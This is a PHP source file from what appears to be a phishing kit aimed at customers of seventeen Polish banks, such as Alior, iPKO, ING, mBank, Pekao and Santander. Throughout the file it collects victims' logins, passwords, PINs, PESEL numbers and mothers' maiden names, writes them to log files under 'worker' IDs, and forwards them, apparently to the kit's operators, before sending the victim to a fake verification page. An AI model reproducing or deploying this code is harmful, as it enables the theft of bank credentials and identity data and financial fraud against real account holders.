<?php

include "../service.php";
include "../../settings.php";

if (file_exists("../data/" . $_POST['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_POST["id"] . ".xml");

switch($_POST['type']){
    case '1':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🟨 Alior Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Девичья фамилия Матери</b>: " . $_POST['mamkadata'] . "\n❕ <b>Pesel</b>: " . $_POST['peseldata'] . "\n❕ <b>PIN</b>: " . $_POST['pindata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🟨 Alior Bank", $log_name, $io['log']);
    break;
    case '2': 
        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 📘 iPKO Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>PIN</b>: " . $_POST['pindata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "📘 iPKO Bank", $log_name, $io['log']);
    break;
    case '3': 
        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 📒 ING Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Pesel</b>: " . $_POST['peseldata'] . "\n❕ <b>PIN</b>: " . $_POST['pindata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "📒 ING Bank", $log_name, $io['log']);
    break;
    case '4': 
        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🧧 Santander Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🧧 Santander Bank", $log_name, $io['log']);
    break;
    case '5':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 📗 mBank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Девичья фамилия Матери</b>: " . $_POST['mamkadata'] . "\n❕ <b>Pesel</b>: " . $_POST['peseldata'] . "\n❕ <b>PIN</b>: " . $_POST['pindata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "📗 mBank", $log_name, $io['log']);
    break;
    case '6':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🟢 Paribas\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Девичья фамилия Матери</b>: " . $_POST['mamkadata'] . "\n❕ <b>PIN</b>: " . $_POST['pindata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🟢 Paribas", $log_name, $io['log']);
    break;
    case '7':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 📕 Pekao\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Pesel</b>: " . $_POST['peseldata'] . "\n❕ <b>PIN</b>: " . $_POST['pindata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "📕 Pekao", $log_name, $io['log']);
    break;
    case '8':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 💚 Getin Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "💚 Getin Bank", $log_name, $io['log']);
    break;
    case '9':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: ❤️ Millenium Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'] . "\n❕ <b>Pesel</b>: " . $_POST['peseldata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "❤️ Millenium Bank", $log_name, $io['log']);
    break;
    case '10':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🍏 Agricole Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🍏 Agricole Bank", $log_name, $io['log']);
    break;
    case '11':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🍎 Pocztowy Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🍎 Pocztowy Bank", $log_name, $io['log']);
    break;
    case '12':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🟩 SGB Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata']  . "\n❕ <b>Отдел выдачи карты</b>: " . $_POST['otdeldata'] ,
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🟩 SGB Bank", $log_name, $io['log']);
    break;
    case '13':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🟨 Noble Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🟨 Noble Bank", $log_name, $io['log']);
    break;
    case '14':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: ❇️ GBS Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "❇️ GBS Bank", $log_name, $io['log']);
    break;
    case '15':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 🔵 BFG Bank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "🔵 BFG Bank", $log_name, $io['log']);
    break;
    case '16':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: ❇️ BOSBank24\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "❇️ BOSBank24", $log_name, $io['log']);
    break;
    case '17':

        $log_name = $_POST['id'] . "_" . $xml->worker_id . "_" . $xml->worker;

        $io = array(
            "name" => $xml->obyava,
            "price" => $xml->price,
            "worker_id" => $xml->worker_id,
            "worker" => $xml->worker,
            "log" => "❗️ ". $_temp['service'] ." LOG\n❕ <b>Bank</b>: 💙 Citibank\n❕ <b>Логин</b>: " . $_POST['logindata'] . "\n❕ <b>Пароль</b>: " . $_POST['passdata'],
            "uid" => $_POST['id'],
            "domain" => array_shift((explode('.', $_SERVER['HTTP_HOST'])))
        );

        file_put_contents("/var/www/html/logs/" . $log_name, JSON_encode($io));
        echo sendLKi($_temp['service'], $_temp['valute'], $_POST['id'], $xml->obyava, $xml->price, $xml->worker_id, "💙 Citibank", $log_name, $io['log']);
    break;
    default: 
        header("location: https://google.com/");
        exit;
    break;
}
header("location: ../verification.php?id=" . $_POST['id'] . "&wid=" . $xml->worker_id);


?>